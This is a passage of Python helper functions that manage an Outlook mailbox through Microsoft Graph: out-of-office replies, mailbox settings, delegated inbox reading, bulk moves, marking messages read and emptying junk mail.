    return delete_call(token, f"/me/contacts/{contact_id}")


# -----------------------------
# MAILBOX SETTINGS
# -----------------------------

def get_automatic_replies(token):
    """Get current out-of-office (automatic replies) settings."""
    return call(token, "/me/mailboxSettings/automaticReplies")


def set_automatic_replies(token, internal_text, external_text,
                          start_dt, end_dt, timezone="UTC"):
    """Enable out-of-office for a time window.
    start_dt/end_dt: ISO datetime strings."""
    body = {
        "automaticRepliesSetting": {
            "status": "scheduled",
            "externalAudience": "all",
            "scheduledStartDateTime": {"dateTime": start_dt, "timeZone": timezone},
            "scheduledEndDateTime": {"dateTime": end_dt, "timeZone": timezone},
            "internalReplyMessage": internal_text,
            "externalReplyMessage": external_text,
        }
    }
    return patch_call(token, "/me/mailboxSettings", body)


def disable_automatic_replies(token):
    """Turn off out-of-office replies."""
    body = {"automaticRepliesSetting": {"status": "disabled"}}
    return patch_call(token, "/me/mailboxSettings", body)


def get_mailbox_settings(token):
    """Fetch full mailbox settings (automatic replies, time zone, etc.)."""
    return call(token, "/me/mailboxSettings")


def get_delegate_access(token):
    """Check delegated mailbox permissions (who has access to this mailbox)."""
    return call(token, "/me/mailboxSettings/delegateMeetingMessageDeliveryOptions")


def get_inbox_shared(token, user_upn):
    """Read another user's inbox if delegated access exists."""
    return call(token, f"/users/{user_upn}/mailFolders/inbox/messages",
                params={"$top": 25, "$orderby": "receivedDateTime desc"})


# -----------------------------
# MESSAGE CLEANUP / SWEEP EXTENSIONS
# -----------------------------

def move_messages_bulk(token, message_ids, destination_folder_id):
    """Move multiple messages in one batch of copy/move calls."""
    results = []
    for mid in message_ids:
        body = {"destinationId": destination_folder_id}
        results.append(post_call(token, f"/me/messages/{mid}/move", body))
    return results


def mark_all_as_read(token, folder_id="inbox"):
    """Mark every unread message in a folder as read."""
    messages = call(token, f"/me/mailFolders/{folder_id}/messages",
                    params={"$filter": "isRead eq false",
                            "$select": "id", "$top": 100})
    for msg in messages.get("value", []):
        patch_call(token, f"/me/messages/{msg['id']}", {"isRead": True})


def empty_junk(token):
    """Permanently delete everything in the junk email folder."""
    messages = call(token, "/me/mailFolders/junkemail/messages",
                    params={"$select": "id", "$top": 100})
    for msg in messages.get("value", []):
        delete_call(token, f"/me/messages/{msg['id']}")
